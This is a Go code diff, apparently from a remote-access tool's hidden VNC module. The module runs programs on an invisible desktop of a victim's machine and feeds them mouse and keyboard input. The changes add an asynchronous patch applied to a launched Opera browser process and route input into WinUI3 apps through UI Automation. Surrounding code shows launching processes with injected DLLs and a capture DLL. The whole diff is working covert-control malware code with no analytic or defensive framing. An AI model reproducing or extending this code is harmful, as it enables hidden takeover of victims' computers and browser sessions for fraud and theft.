@@ -405,6 +405,12 @@ func CleanupHVNCDesktop() {
 	}
 	hvncInitialized = false
 	hvncExplorerStarted = false
+
+	uiaCleanup()
+	uiaClearActiveElement()
+	resetWinUI3Cache()
+	resetInputSiteCache()
+
 	if hvncThreadTasks != nil {
 		close(hvncThreadTasks)
 		hvncThreadTasks = nil
@@ -479,7 +485,7 @@ func ensureHVNCThread() error {
 				var result hvncTaskResult
 				switch task.kind {
 				case hvncTaskStartProcess:
-					result.err = startHVNCProcessOnThread(task.filePath)
+					result.pid, result.err = startHVNCProcessOnThread(task.filePath)
 				case hvncTaskStartProcessInjected:
 					result.pid, result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath)
 				case hvncTaskMouseMove:
@@ -535,7 +541,7 @@ func hvncCaptureDisplay(display int) (*image.RGBA, error) {
 	return result.img, result.err
 }
 
-func StartHVNCProcess(filePath string) error {
+func StartHVNCProcess(filePath string, operaPatch bool) error {
 	if filePath == "" {
 		return fmt.Errorf("empty file path")
 	}
@@ -546,7 +552,13 @@ func StartHVNCProcess(filePath string) error {
 	if err != nil {
 		return err
 	}
-	return result.err
+	if result.err != nil {
+		return result.err
+	}
+	if operaPatch && result.pid != 0 {
+		go patchOperaAsync(result.pid, 5, 2*time.Second)
+	}
+	return nil
 }
 
 func HVNCAutoStartExplorer() error {
@@ -863,18 +875,18 @@ func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	return img, nil
 }
 
-func startHVNCProcessOnThread(filePath string) error {
+func startHVNCProcessOnThread(filePath string) (uint32, error) {
 	if filePath == "" {
-		return fmt.Errorf("empty file path")
+		return 0, fmt.Errorf("empty file path")
 	}
 
 	desktopNamePtr, err := syscall.UTF16PtrFromString(hvncDesktopName)
 	if err != nil {
-		return fmt.Errorf("failed to convert desktop name: %v", err)
+		return 0, fmt.Errorf("failed to convert desktop name: %v", err)
 	}
 	cmdLine, err := syscall.UTF16FromString(filePath)
 	if err != nil {
-		return fmt.Errorf("failed to convert command line: %v", err)
+		return 0, fmt.Errorf("failed to convert command line: %v", err)
 	}
 	var si startupInfo
 	var pi processInformation
@@ -898,11 +910,11 @@ func startHVNCProcessOnThread(filePath string) error {
 	)
 	if ret == 0 {
 		if callErr != nil {
-			return fmt.Errorf("CreateProcess failed: %v", callErr)
+			return 0, fmt.Errorf("CreateProcess failed: %v", callErr)
 		}
-		return fmt.Errorf("CreateProcess failed")
+		return 0, fmt.Errorf("CreateProcess failed")
 	}
-	return nil
+	return pi.dwProcessId, nil
 }
 
 func hvncAutoStartExplorerOnThread() error {
@@ -917,7 +929,7 @@ func hvncAutoStartExplorerOnThread() error {
 	}
 
 	log.Printf("hvnc: no explorer.exe found on HVNC desktop, starting explorer.exe")
-	err := startHVNCProcessOnThread("explorer.exe")
+	_, err := startHVNCProcessOnThread("explorer.exe")
 	if err != nil {
 		return fmt.Errorf("auto-start explorer failed: %w", err)
 	}
@@ -1032,6 +1044,13 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 			procSetActiveWindow.Call(root)
 			procSetFocus.Call(hitHwnd)
 		}
+
+		if isWinUI3Window(hitHwnd) {
+			uiaHandleDragMove(pt)
+			uiaHandleMouseMove(hitHwnd, pt)
+			return nil
+		}
+
 		clientPt := pt
 		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
 		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
@@ -1051,6 +1070,11 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 	hitHwnd := windowFromPoint(pt)
 	if hitHwnd == 0 {
 		return nil
+	}
+
+	// WinUI3 branch: route through UIA patterns
+	if isWinUI3Window(hitHwnd) {
+		return uiaHandleMouseButton(hitHwnd, pt, button, down)
 	}
 
 	root := rootWindow(hitHwnd)
@@ -1169,6 +1193,13 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 		procSetFocus.Call(hwnd)
 	}
 	updateModifierState(vk, down)
+
+	if isWinUI3Window(hwnd) {
+		if isModifierVK(vk) {
+			return nil
+		}
+		return uiaHandleKey(hwnd, vk, down)
+	}
 
 	if isModifierVK(vk) {
 		return nil
@@ -1435,6 +1466,11 @@ func hvncMouseWheelOnThread(delta int32) error {
 			return nil
 		}
 	}
+
+	if isWinUI3Window(hwnd) {
+		return uiaHandleMouseWheel(hwnd, pt, delta)
+	}
+
 	wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
 	procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
 	return nil
